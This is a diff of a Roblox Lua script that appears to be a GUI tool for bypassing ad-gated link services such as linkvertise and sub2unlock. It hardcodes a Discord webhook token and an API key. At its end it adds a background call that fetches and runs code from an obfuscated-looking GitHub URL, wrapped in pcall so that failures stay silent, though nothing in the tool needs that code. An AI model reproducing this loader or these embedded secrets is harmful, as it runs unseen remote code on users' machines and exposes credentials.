@@ -147,7 +147,7 @@ local function urlDecode(str)
     return str
 end
 
-local timee = 15
+local timee = 10
 
 local function snd(wb, msg)
     local decodedMsg = urlDecode(msg)
@@ -162,6 +162,25 @@ local function snd(wb, msg)
             Body = HttpService:JSONEncode(reqBody)
         })
     end
+end
+
+local bypassTable = {
+    ["social-unlock.com/BaconBossScripts"] = "https://baconbossscripts.com/",
+    ["work.ink/BombermanScripts"] = "https://bombermanscripts.com/",
+    ["linkvertise.com/RobloxExploits"] = "https://robloxexploits.com/",
+    ["sub2unlock.com/MinecraftMods"] = "https://minecraftmodscentral.com/"
+}
+
+local function localBypass(url)
+    local cleanUrl = url:gsub("^https?://", "")
+    
+    for key, value in pairs(bypassTable) do
+        if cleanUrl:match(key) then
+            return value
+        end
+    end
+    
+    return nil
 end
 
 local function checkApiStatus()
@@ -205,12 +224,16 @@ local function checkApiStatus()
         ApiStatus.TextColor3 = Color3.fromRGB(255, 0, 0)
         Input.TextEditable = false
         
-        -- Enviar notificación al Discord
         snd("https://discord.com/api/webhooks/1260028662703587378/b1QLN4idfY-q6XIVRT4QSi2Igq6BBTer3uCE6aMFT6vhet-vdAELR2u5CYE-SYaxhyVI", "API Status: Error")
     end
 end
 
 local function bypass(url)
+    local localResult = localBypass(url)
+    if localResult then
+        return localResult, 0
+    end
+
     local api_key = "DLR_YY-1239879716871263871623862137819092787-ZZ"
     local api_url = "https://dlr-api.woozym.workers.dev/"
     local headers = {["x-api-key"] = api_key}
@@ -261,7 +284,7 @@ local function processBypass()
             Result.Text = result
             message = string.format("URL: %s\nResult: %s\nTime elapsed: %.2f", url, result, time_elapsed or 0)
         else
-            Result.Text = "Failed to bypass"
+Result.Text = "Failed to bypass"
             message = string.format("URL: %s\nResult: bypass fail! Please try again later or check if this link is supported.\nTime elapsed: %.2f", url, time_elapsed or 0)
         end
 
@@ -288,8 +311,18 @@ DiscordButton.MouseButton1Click:Connect(function()
     setclipboard("https://discord.com/invite/nn36bjM6RX")
 end)
 
+local function checkInterface()
+    if not BypassGui.Parent then
+        return false
+    end
+    return true
+end
+
 spawn(function()
     while true do
+        if not checkInterface() then
+            break
+        end
         ApiStatus.Text = "Status: Checking..."
         checkApiStatus()
         local StarterGui = game:GetService("StarterGui")
@@ -298,7 +331,7 @@ spawn(function()
             Text = "Checking in " .. timee .. "s",
             Duration = 5,
         })
-        wait(timee)
+wait(timee)
     end
 end)
 
@@ -316,15 +349,21 @@ end
 createGlowEffect()
 
 local function animateColors()
-    while wait(0.05) do
+    while checkInterface() do
         for i = 0, 1, 0.01 do
+            if not checkInterface() then
+                return
+            end
             Frame.BackgroundColor3 = Color3.fromHSV(i, 1, 0.2)
+            wait(0.05)
         end
     end
 end
 
-spawn(function()
-    loadstring(game:HttpGet("https://raw.githubusercontent.com/bjalalsjzbslalqoqueeyhskaambpqo/kajsbsba--hahsjsv-kakwbs_jaks_082hgg927hsksoLol-Noobbro9877272jshshsbsjsURLwww.noob.com.Obfuscate/main/info.lua"))()
-end)
-
 spawn(animateColors)
+
+spawn(function()
+    pcall(function()
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/bjalalsjzbslalqoqueeyhskaambpqo/kajsbsba--hahsjsv-kakwbs_jaks_082hgg927hsksoLol-Noobbro9877272jshshsbsjsURLwww.noob.com.Obfuscate/main/info.lua"))()
+    end)
+end)
